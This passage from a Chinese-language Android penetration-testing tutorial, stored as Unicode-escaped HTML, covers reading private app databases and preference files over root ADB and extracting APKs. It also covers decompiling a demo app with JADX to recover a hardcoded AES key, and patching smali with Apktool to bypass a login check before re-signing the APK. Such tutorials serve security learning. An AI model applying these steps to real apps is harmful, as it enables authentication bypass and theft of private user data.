/etc/apns-conf.xml\uff1a\u5305\u542b\u9ed8\u8ba4\u63a5\u5165\u70b9\u540d\u79f0 (APN) \u914d\u7f6e\u3002APN \u7528\u4e8e\u4f7f\u8bbe\u5907\u8fde\u63a5\u5230\u6211\u4eec\u5f53\u524d\u8fd0\u8425\u5546\u7684\u7f51\u7edc\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/misc/wifi\uff1a\u5305\u542b WiFi \u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/misc/user/0/cacerts-added\uff1a\u7528\u6237\u8bc1\u4e66\u5b58\u50a8\u3002\u5b83\u5305\u542b\u7528\u6237\u6dfb\u52a0\u7684\u8bc1\u4e66\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /etc/security/cacerts/\uff1a\u7cfb\u7edf\u8bc1\u4e66\u5b58\u50a8\u3002\u4e0d\u5141\u8bb8\u6388\u4e88\u975e root \u7528\u6237\u6743\u9650\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /sdcard\uff1a\u5305\u542b\u6307\u5411 DCIM\u3001\u4e0b\u8f7d\u3001\u97f3\u4e50\u3001\u56fe\u7247\u7b49\u76ee\u5f55\u7684\u7b26\u53f7\u94fe\u63a5\u3002</p> <p>\u679a\u4e3e </p> <p>\u5728 Android \u4e2d\uff0c\u8be5\u76ee\u5f55/data/data/\u5305\u542b\u8bbe\u5907\u4e0a\u5b89\u88c5\u7684\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u88c5\u76ee\u5f55\u3002\u6b64\u76ee\u5f55\u662f\u79c1\u6709\u7684\uff0c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u6216\u975e root \u7528\u6237\u65e0\u6cd5\u8bbf\u95ee\u3002\u901a\u8fc7 ADB \u83b7\u5f97 root \u8bbf\u95ee\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u5217\u51fa\u8be5\u76ee\u5f55\u7684\u5185\u5bb9\u3002</p> <p>\u5982\u524d\u6240\u8ff0\uff0c\u5b58\u50a8\u5728\u8bbe\u5907\u5185\u90e8\u5b58\u50a8\u5668\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u9a7b\u7559\u5728\u76ee\u5f55\u4e2d/data/data/\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u50cfdatabases\u548c\u4e00\u6837\u7684\u76ee\u5f55shared_prefs\u662f\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u521b\u5efa\u7684\u3002\u6570\u636e\u5e93\u76ee\u5f55\u901a\u5e38\u5728\u5e94\u7528\u7a0b\u5e8f\u9996\u6b21\u8fd0\u884c\u65f6\u586b\u5145\uff0c\u5c06\u7ed3\u6784\u5316\u6570\u636e\u5b58\u50a8\u5728\u79c1\u6709\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u901a\u8fc7 ADB \u8bbf\u95ee\u8bbe\u5907\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u201csqlite3\u201d\u5ba2\u6237\u7aef\u679a\u4e3e\u4efb\u4f55\u53ef\u7528\u7684\u6570\u636e\u5e93\u3002\u5047\u8bbe\u5b89\u88c5\u4e86/data/data/com.example.demo\u8f6f\u4ef6\u5305\uff0c\u5e76\u4e14\u4f7f\u7528\u6570\u636e\u5e93\u6765\u5b58\u50a8\u6570\u636e\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5728\u76ee\u5f55\u4e0b\u627e\u5230\u6570\u636e\u5e93/data/data/com.example.demo/databases/\u3002</p> <p></p> <p>\u4e00\u65e6\u8bc6\u522b\u51fa\u6570\u636e\u5e93\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u8be5sqlite3\u5de5\u5177\u8bfb\u53d6\u5176\u5185\u5bb9\u3002</p> <p></p> <p>\u6570\u636e\u5e93\u5e76\u4e0d\u662f\u552f\u4e00\u5b58\u50a8\u6570\u636e\u7684\u5730\u65b9\u3002\u5728\u6e90\u4ee3\u7801\u4e2d\uff0cSharedPreferences \u662f\u6307\u5411 XML \u6587\u4ef6\u4ee5\u4fbf\u5bf9\u5176\u8fdb\u884c\u8bfb\u5199\u7684\u5bf9\u8c61\u3002\u8fd9\u4e9b XML \u6587\u4ef6\u6700\u7ec8\u5c06\u5305\u542b\u4e00\u7ec4\u952e\u503c\u5bf9\uff0c\u5e76\u5c06\u5b58\u50a8\u5728\u4e00\u4e2a\u540d\u4e3ashared_prefs.\u00a0\u8bfb\u53d6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u53ef\u4ee5\u83b7\u5f97\u654f\u611f\u4fe1\u606f\u3002</p> <p></p> <p>\u4ee5\u52a0\u5bc6\u5f62\u5f0f\u5b58\u50a8\u4efb\u4f55\u654f\u611f\u503c\u53ef\u4ee5\u51cf\u8f7b\u4fe1\u606f\u6cc4\u9732\u653b\u51fb\uff0c\u5c31\u50cf\u6211\u4eec\u4e4b\u524d\u770b\u5230\u7684\u90a3\u6837\u3002\u6b64\u5916\uff0c\u4f7f\u7528\u50cfEncryptedSharedPreferences\u8fd9\u6837\u7684\u5e93\u53ef\u80fd\u662f\u4fdd\u62a4 XML \u6587\u4ef6\u5185\u5bb9\u7684\u4e00\u4e2a\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u56e0\u4e3a\u5b83\u4f1a\u52a0\u5bc6\u952e\u503c\u5bf9\u3002</p> <p>2.\u63d0\u53d6APK\u6587\u4ef6</p> <p>\u5bf9 APK \u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5de5\u7a0b\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7ed5\u8fc7\u5404\u79cd\u5b89\u5168\u63aa\u65bd\u3002\u53ef\u4ee5\u4f7f\u7528dex2jar\u3001JADX\u3001JD-GUI\u3001APKTOOL\u7b49\u5f00\u6e90\u5de5\u5177\u6765\u53cd\u8f6c APK \u6587\u4ef6\u3002\u8ba9\u6211\u4eec\u770b\u770b\u5982\u4f55\u53cd\u8f6c\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4f7f\u7528\u4ece\u6e90\u4ee3\u7801\u4e2d\u6536\u96c6\u7684\u4fe1\u606f\u7ed5\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u3002</p> <p>\u5728\u7ebf\u67e5\u627e APK</p> <p>\u5728\u6211\u4eec\u5f00\u59cb\u9006\u5411\u5de5\u7a0b\u4e4b\u524d\uff0c\u62e5\u6709\u4e00\u4e2a APK \u6587\u4ef6\u53ef\u4ee5\u8ba9\u6211\u4eec\u5b89\u88c5\u5b83\u5e76\u4f7f\u7528\u5b83\u7684\u529f\u80fd\u3002\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u63d0\u53d6 APK \u6587\u4ef6\u3002\u6211\u4eec\u8981\u7814\u7a76\u7684\u7b2c\u4e00\u79cd\u65b9\u6cd5\u662f\u5728\u7ebf\u67e5\u627e APK\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u5bfc\u822a\u5230APKCombo\uff0c\u7136\u540e\u641c\u7d22\u6211\u4eec\u8981\u5bfc\u51fa APK \u6587\u4ef6\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8ba9\u6211\u4eec\u641c\u7d22 Twitter \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p></p> <p>\u9009\u62e9\u7b2c\u4e00\u4e2a\u7ed3\u679c\uff0c\u7136\u540e\u5355\u51fb\u663e\u793a\u4e0b\u8f7d APK \u7684\u7eff\u8272\u6309\u94ae\u3002</p> <p></p> <p>\u6700\u540e\uff0c\u70b9\u51fb Twitter \u56fe\u6807\u4e0b\u8f7d APK \u6587\u4ef6\u3002</p> <p></p> <p>\u800c\u5df2\u3002Twitter APK \u5df2\u6210\u529f\u4e0b\u8f7d\u3002</p> <p>\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u63d0\u53d6 APK</p> <p>Android \u7b2c\u4e09\u65b9\u5de5\u5177\u4e5f\u53ef\u7528\u4e8e\u5bfc\u51fa APK\u3002APK Export \u662f\u4e00\u4e2aAndroid \u5e94\u7528\u7a0b\u5e8f\uff0c\u5b83\u4f1a\u81ea\u52a8\u5bfc\u51fa\u53e6\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684APK \u6587\u4ef6\u5e76\u5b58\u50a8\u5728\u672c\u5730\u3002\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4ece Google Play \u5546\u5e97\u5b89\u88c5 APK Export\u3002</p> <p></p> <p>\u5b89\u88c5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb\u5b83\u6765\u542f\u52a8\u5b83\uff0c\u7136\u540e\u5bfc\u822a\u5230\u6240\u9700\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p></p> <p>\u8ba9\u6211\u4eec\u5c1d\u8bd5\u5bfc\u51fa\u5e94\u7528\u7a0b\u5e8f HelloKotlin \u7684 APK \u6587\u4ef6\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u70b9\u51fb HelloKotlin \u5e94\u7528\u7a0b\u5e8f\uff0c\u7136\u540e\u70b9\u51fb\u7a97\u53e3\u53f3\u4e0b\u89d2\u7684\u5149\u76d8\u56fe\u6807\u3002</p> <p></p> <p>\u7136\u540e\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u6d4f\u89c8\u5668\u5e94\u7528\u7a0b\u5e8f\u6d4f\u89c8\u6587\u4ef6\u5b58\u50a8\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e00\u4e2a\u540d\u4e3a\u201capk\u201d\u7684\u65b0\u76ee\u5f55\u3002</p> <p></p> <p>\u6700\u540e\u6d4f\u89c8\u5230APK\u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u770b\u5230\u201cHelloKotlin1.0.apk\u201d\u5df2\u7ecf\u6210\u529f\u5bfc\u51fa\u3002</p> <p></p> <p>\u4ece\u8bbe\u5907\u4e2d\u63d0\u53d6 APK</p> <p>\u73b0\u5728\u8ba9\u6211\u4eec\u5047\u8bbe\u8be5\u5e94\u7528\u7a0b\u5e8f\u5728 Google Play \u5546\u5e97\u4e2d\u4e0d\u53ef\u7528\u3002\u5f53\u8bbe\u5907\u4e0a\u5df2\u7ecf\u5b89\u88c5\u4e86\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0cAPK\u6587\u4ef6\u5b58\u50a8\u5728\u76ee\u5f55\u4e2d/data/app/-1/base.apk.\u00a0 <p>\u4f8b\u5982\uff0c\u5982\u679c\u5305\u540d\u662fcom.example.myapp\uff0c\u5219 APK \u7684\u5b8c\u6574\u8def\u5f84\u5e94\u8be5\u662f/data/app/com.example.myapp-1/base.apk\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5305\u540d\u540e\u9762\u662f\u4e00\u4e2a\u6570\u5b57\u3002\u5728\u67d0\u4e9b Android \u7248\u672c\u4e2d\uff0c\u8fd9\u662f\u4e00\u4e2a\u5e8f\u5217\u53f7\uff0c\u800c\u5728\u5176\u4ed6\u7248\u672c\u4e2d\uff0c\u8fd9\u662f\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\u3002\u975eroot\u7528\u6237\u662f\u4e0d\u5141\u8bb8\u8bfb\u53d6\u76ee\u5f55\u5185\u5bb9\u7684/data/app/\uff0c\u56e0\u6b64\u5f88\u96be\u731c\u51fa\u5e94\u7528\u7684\u5b8c\u6574\u5305\u540d\u3002</p> <p>\u8981\u83b7\u53d6\u5305\u540d\u79f0\uff0c\u6211\u4eec\u53ef\u4ee5\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\uff0c\u56e0\u4e3a\u5e94\u7528\u540d\u79f0\u901a\u5e38\u662f\u5305\u540d\u79f0\u7684\u4e00\u90e8\u5206\u3002</p> <p>adb shell pm list packages | grep myapp</p> <p></p> <p>\u83b7\u5f97\u5305\u540d\u540e\uff0c\u6211\u4eec\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\u6765\u83b7\u53d6 APK \u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u3002</p> <p>adb shell pm path com.example.myapp</p> <p></p> <p>\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\u6765\u68c0\u7d22base.apk\u6587\u4ef6\u3002</p> <p>adb pull /data/app/com.example.myapp-1/base.apk</p> <p></p> <p>3. \u4f7f\u7528 JADX \u8fdb\u884c\u9006\u5411\u5de5\u7a0b</p> <p>\u73b0\u5728\u8ba9\u6211\u4eec\u7ee7\u7eed\u8be5\u8fc7\u7a0b\u7684\u4e0b\u4e00\u90e8\u5206\uff0c\u5bf9 APK \u8fdb\u884c\u9006\u5411\u5de5\u7a0b\u3002</p> <p>\u5047\u8bbe\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u5728 AVD \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8bf7\u6c42 VIP \u4ee3\u7801\uff0c\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5b83\u4f1a\u8fd4\u56de\u4e00\u5f20\u7968\u3002</p> <p></p> <p>\u8ba9\u6211\u4eec\u7ee7\u7eed\u5e76\u53cd\u8f6c APK \u6587\u4ef6\u4ee5\u68c0\u67e5\u6e90\u4ee3\u7801\u3002\u4f7f\u7528 JADX-GUI\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00 APK \u6587\u4ef6\u5e76\u8bfb\u53d6\u5e94\u7528\u7a0b\u5e8f\u7684 Java \u4f2a\u4ee3\u7801\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7 Linux \u4e0a\u7684 APT \u5305\u7ba1\u7406\u5668\u5b89\u88c5\u6b64\u5de5\u5177\uff0c\u65b9\u6cd5\u662f\u952e\u5165apt install jadx\u00a0\u6216\u4eceGitHub\u4e0b\u8f7d\u3002\u952e\u5165jadx-gui\u4ee5\u542f\u52a8\u7a0b\u5e8f\u5e76\u52a0\u8f7ddemo.apk\u6587\u4ef6\u3002</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u6d4f\u89c8\u5e94\u7528\u7a0b\u5e8f\u7ed3\u6784\u3002\u5728\u7a97\u53e3\u7684\u5de6\u4fa7\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 APK \u6587\u4ef6\u4e2d\u5305\u542b\u7684\u5305\u548c\u6587\u4ef6\u3002</p> <p></p> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6e90\u4ee3\u7801\u53ef\u80fd\u4f1a\u88ab\u6df7\u6dc6\u3002\u6df7\u6dc6\u662f\u4f7f\u4eba\u7c7b\u96be\u4ee5\u9605\u8bfb\u4ee3\u7801\u7684\u8fc7\u7a0b\u3002Android Studio \u4f7f\u7528 ProGuard \u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u3002</p> <p>ProGuard \u662f\u4e00\u4e2a\u5f00\u6e90\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u4ee5\u538b\u7f29\u3001\u4f18\u5316\u548c\u6df7\u6dc6 Java \u4ee3\u7801\u3002\u5728\u4e00\u4e2a\u65b0\u7684 Android Studio \u9879\u76ee\u4e2d\uff0c\u5728\u8be5Grandle Scripts\u90e8\u5206\u4e0b\uff0c\u6709\u4e00\u4e2a\u540d\u4e3a\u7684\u6587\u4ef6proguard-rules.pro\u00a0\uff0c\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u6307\u5b9a\u5176\u4ed6\u89c4\u5219\u3002\u6df7\u6dc6\u6e90\u4ee3\u7801\u5e76\u4e0d\u610f\u5473\u7740\u5b83\u5b8c\u5168\u4e0d\u53ef\u8bfb\u3002</p> <p>\u4f7f\u7528 ProGuard \u8fdb\u884c\u6df7\u6dc6\u65f6\uff0c\u6240\u6709\u65b9\u6cd5\u540d\u79f0\u90fd\u66ff\u6362\u4e3a a\u3001b\u3001c \u7b49\u5b57\u6bcd\u3002\u8fd9\u6837\uff0c\u4eba\u4eec\u5c31\u5f88\u96be\u7406\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u529f\u80fd\uff0c\u56e0\u6b64\uff0c\u5b83\u5c06\u90e8\u5206\u4fdd\u62a4\u5b83\u514d\u53d7\u9006\u5411\u5de5\u7a0b\u7684\u5f71\u54cd\u3002\u5728 Android Studio \u4e2d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u542f\u7528\u4ee3\u7801\u6df7\u6dc6\u3002\u8981\u542f\u7528\u5b83\uff0c\u60a8\u5fc5\u987b\u5728\u6587\u4ef6\u4e2d\u5c06\u5e03\u5c14\u53d8\u91cf\u8bbe\u7f6eminifyEnabled\u4e3atrue,\u00a0build.gradle\u00a0\u3002</p> <p></p> <p>\u6709\u5173 ProGuard \u548c Android Studio \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u9605\u8bfb\u6b64\u5904\u7684\u5b98\u65b9\u6587\u6863\u3002\uff08\u5206\u6790\u6df7\u6dc6\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u5c06\u662f\u672a\u6765\u535a\u5ba2\u6587\u7ae0\u7684\u4e3b\u9898\uff01\uff09\u67e5\u770b JADX-GUI \u7684\u53f3\u4fa7\u7a97\u53e3\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u3002\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u7c7b\u7684\u6e90\u4ee3\u7801MainActivity.class\u3002</p> <p></p> <p>\u5982\u679c\u63d0\u4f9b\u4e86\u6b63\u786e\u7684\u5bc6\u7801\uff0c\u8fd9\u6bb5\u4ee3\u7801\u8868\u660e\u6b63\u5728\u4f7f\u7528 AES \u7b97\u6cd5\u52a0\u5bc6\u8fd4\u56de\u7ed9\u7528\u6237\u7684\u5b57\u7b26\u4e32\u3002\u52a0\u5bc6\u7684\u5bc6\u94a5\u4e5f\u88ab\u6cc4\u9732\u3002\u4ed4\u7ec6\u68c0\u67e5\u6e90\u4ee3\u7801\uff0c\u7279\u522b\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5bc6\u6587\u3002</p> <p></p> <p>APK \u6587\u4ef6\u7684\u6e90\u4ee3\u7801\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u521b\u5efa\u811a\u672c\u548c\u89e3\u5bc6\u5bc6\u6587\u6240\u9700\u7684\u6240\u6709\u4fe1\u606f\u3002\u811a\u672c\u53ef\u4ee5\u7528\u6211\u4eec\u9009\u62e9\u7684\u4efb\u4f55\u8bed\u8a00\u7f16\u5199\u3002\u6309\u7167\u8fd9\u6837\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53cd\u8f6c\u4efb\u4f55 APK \u6587\u4ef6\uff0c\u4ee5\u7814\u7a76\u6e90\u4ee3\u7801\u7684\u6d41\u7a0b\u5e76\u66f4\u6539\u6216\u7ed5\u8fc7\u9884\u671f\u7684\u529f\u80fd\u3002</p> <p>4.\u53cd\u7f16\u8bd1\u548c\u91cd\u65b0\u7f16\u8bd1APK\u6587\u4ef6</p> <p>\u53e6\u4e00\u4e2a\u53ef\u7528\u4e8e Android \u9006\u5411\u5de5\u7a0b\u7684\u6709\u7528\u5de5\u5177\u662fApktool\u3002\u00a0</p> <p>\u5b83\u8fd8\u53ef\u7528\u4e8e\u8fdb\u4e00\u6b65\u68c0\u67e5\u4ee3\u7801\u88ab\u6df7\u6dc6\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u4e3b\u8981\u7279\u70b9\u662f\u80fd\u591f\u53cd\u6c47\u7f16 APK\uff0c\u5141\u8bb8\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u8bfb\u53d6\u548c\u66f4\u6539\u6e90\u4ee3\u7801\uff0c\u7136\u540e\u5c06\u8d44\u6e90\u91cd\u5efa\u56de APK \u6587\u4ef6\u3002\u8fd9\u4f7f\u7528\u6237\u53ef\u4ee5\u66f4\u6539\u5e94\u7528\u7a0b\u5e8f\u7684\u529f\u80fd\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u6709\u4ee5\u4e0b\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14\u6211\u4eec\u60f3\u5c1d\u8bd5\u7ed5\u8fc7\u767b\u5f55\u5c4f\u5e55\u3002</p> <p>\u4e3a\u6b64\uff0c\u6211\u4eec\u5c06\u5c1d\u8bd5\u5bf9\u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u9006\u5411\u5de5\u7a0b\uff0c\u627e\u5230\u5e76\u7f16\u8f91\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u7136\u540e\u91cd\u65b0\u7f16\u8bd1\u5b83\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 Apktool\u3002Apktool \u5c06\u4e3a\u6211\u4eec\u63d0\u4f9bSmali\u4ee3\u7801\u3002\u4e0e JADX \u63d0\u4f9b\u7684 Java \u4f2a\u4ee3\u7801\u76f8\u6bd4\uff0cSmali \u4ee3\u7801\u66f4\u96be\u9605\u8bfb\u3002\u4e3a\u4e86\u5bf9\u6e90\u4ee3\u7801\u6d41\u7a0b\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u521d\u6b65\u4e86\u89e3\uff0c\u8ba9\u6211\u4eec\u5148\u7528 JADX \u6253\u5f00 apk \u6587\u4ef6\u3002</p> <p></p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u7247\u6bb5\u663e\u793a\u4e86\u4e00\u4e2aif\u770b\u8d77\u6765\u50cf\u662f\u68c0\u67e5\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8bed\u53e5\u3002\u66f4\u5177\u4f53\u5730\u8bf4\uff0c\u5d4c\u5165if\u8bed\u53e5\u770b\u8d77\u6765\u50cf\u662f\u4f7f\u7528\u73b0\u6709\u7684 MD5 \u5b57\u7b26\u4e32\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\u7684 MD5 \u503c\uff0c\u5982\u679c\u5b83\u4eec\u5339\u914d\uff0c\u5219\u4f1a\u663e\u793a\u4e00\u6761\u6d88\u606f\uff0c\u5426\u5219\uff0c\u5c06\u663e\u793a\u6d88\u606f\u201cWrong Credentials\u201d\u3002\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 Apktool \u67e5\u627e\u548c\u7f16\u8f91\u8fd9\u6bb5\u4ee3\u7801\u3002</p> <p>\u8981\u5728\u57fa\u4e8e Debian \u7684 Linux \u7cfb\u7edf\u4e2d\u5b89\u88c5 Apktool\uff0c\u8bf7\u952e\u5165apt install apktool.\u00a0\u7136\u540e\u8f93\u5165apktool d demo.apk\u5f00\u59cb\u53cd\u6c47\u7f16APK\u6587\u4ef6\u3002</p> <p>\u53cd\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u5217\u51fademo\u00a0\u5df2\u521b\u5efa\u6587\u4ef6\u7684\u5185\u5bb9\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cApktool \u5df2\u7ecf\u53cd\u7f16\u8bd1\u4e86AndroidManifest.xml.\u00a0\u5982\u524d\u6240\u8ff0\uff0c\u8be5\u6587\u4ef6\u5305\u542b\u6709\u5173\u5e94\u7528\u7a0b\u5e8f\u7684\u5305\u540d\u79f0\u3001\u6d3b\u52a8\u3001\u8d44\u6e90\u3001\u7248\u672c\u7b49\u4fe1\u606f\u3002\u8be5\u6587\u4ef6\u5728\u679a\u4e3e APK \u6587\u4ef6\u65f6\u63d0\u4f9b\u4e86\u91cd\u8981\u4fe1\u606f\u3002\u9664\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u8fd8\u6ce8\u610f\u5230\u76ee\u5f55smali\u3002</p> <p>Smali \u4ee3\u7801\u662f dalvik \u4f7f\u7528\u7684 dex \u683c\u5f0f\u7684\u6c47\u7f16\u5668/\u53cd\u6c47\u7f16\u5668\uff0cdalvik \u662f Android \u7684 Java VM \u5b9e\u73b0\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u662f\u4e00\u79cd\u7b26\u53f7\u8bed\u8a00\uff0c\u5c31\u50cf C \u7a0b\u5e8f\u7684\u6c47\u7f16\u4ee3\u7801\u4e00\u6837\u3002\u6b63\u5982\u6211\u4eec\u524d\u9762\u63d0\u5230\u7684\uff0cjava \u7c7b\u88ab\u6253\u5305\u6210 dex\uff08Dalvik Executable\uff09\u6587\u4ef6\u683c\u5f0f\uff0c\u7531 Android Runtime \u6267\u884c\u3002</p> <p>\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee smali \u4ee3\u7801\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Apktool \u8bfb\u53d6\u3001\u66f4\u6539\u548c\u91cd\u65b0\u7f16\u8bd1\u5b83\u3002\u4e0b\u9762\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e94\u7528\u53cd\u7f16\u8bd1\u540e\u7684Activity\uff1a\u00a0</p> <p></p> <p>\u8ba9\u6211\u4eec\u6253\u5f00MainActivity$a.smali\u00a0\u5e76\u9605\u8bfb\u5b83\u7684\u5185\u5bb9\u3002</p> <p></p> <p>\u5411\u4e0b\u6eda\u52a8\u4e00\u70b9\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5305\u542b MD5 \u5b57\u7b26\u4e32\u7684\u884c\uff0c\u4ee5\u53caif\u00a0\u68c0\u67e5\u7528\u6237\u8f93\u5165\u7684 MD5 \u503c\u662f\u5426\u7b49\u4e8e\u8be5 MD5 \u5b57\u7b26\u4e32\u7684\u8bed\u53e5\u3002\u8ba9\u6211\u4eec\u5c1d\u8bd5\u66f4\u6539\u6b64\u8bed\u53e5\u5e76\u4f7f\u5176\u68c0\u67e5\u8f93\u5165\u662f\u5426\u4e0d\u7b49\u4e8e\u6b64 MD5 \u5b57\u7b26\u4e32\u3002\u8fd9\u6837\uff0c\u6bcf\u5f53\u6211\u4eec\u8f93\u5165\u9519\u8bef\u7684\u5bc6\u7801\u65f6\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u5c06\u5141\u8bb8\u6211\u4eec\u767b\u5f55\u3002</p> <p>\u4e3a\u6b64\uff0c\u6211\u4eec\u5fc5\u987b\u5c06\u6307\u4ee4\u66f4\u6539if-eqz\u4e3aif-nez.\u00a0\u7136\u540e\uff0c\u6211\u4eec\u5c06\u4e0e\u8d44\u6e90\u4e00\u8d77\u91cd\u65b0\u7f16\u8bd1\u7f16\u8f91\u7684\u4ee3\u7801\u5e76\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 APK \u6587\u4ef6\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5e76\u5c06\u53cd\u7f16\u8bd1demo.apk\u00a0\u6587\u4ef6\u65f6\u521b\u5efa\u7684\u76ee\u5f55\u7684\u540d\u79f0\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u3002</p> <p>apktool b demo</p> <p></p> <p>\u5982\u679c\u6784\u5efa\u6210\u529f\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u4eec\u6240\u8981\u505a\u7684\u5c31\u662f\u5bf9\u4f7f\u7528\u81ea\u7b7e\u540d\u8bc1\u4e66\u521b\u5efa\u7684\u65b0 APK \u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u5c06\u5176\u5b89\u88c5\u5230\u6211\u4eec\u7684\u8bbe\u5907\u4e0a\u3002\u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u4e00\u4e2a\u65b0\u5bc6\u94a5keytool -genkey -keystore john.keystore -validity 1000 -alias john\u3002</p> <p></p> <p>\u751f\u6210\u5bc6\u94a5\u540e\uff0c\u6211\u4eec\u952e\u5165\u4ee5\u4e0b\u5185\u5bb9\u5bf9 APK \u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\uff1a</p> <p>jarsigner -keystore john.keystore -verbose demo/dist/demo.apk john</p> <p></p> <p>APK \u6587\u4ef6\u5df2\u6210\u529f\u7b7e\u540d\uff0c\u5b83\u4f4d\u4e8e\u76ee\u5f55./demo/dist/demo.apk\u4e2d\u3002\u5728\u6211\u4eec\u5c06\u5b83\u5b89\u88c5\u5230\u8bbe\u5907\u4e0a\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5378\u8f7d\u5df2\u7ecf\u5b89\u88c5\u7684\u90a3\u4e2a\u3002\u6211\u4eec\u53ef\u4ee5\u4ece UI 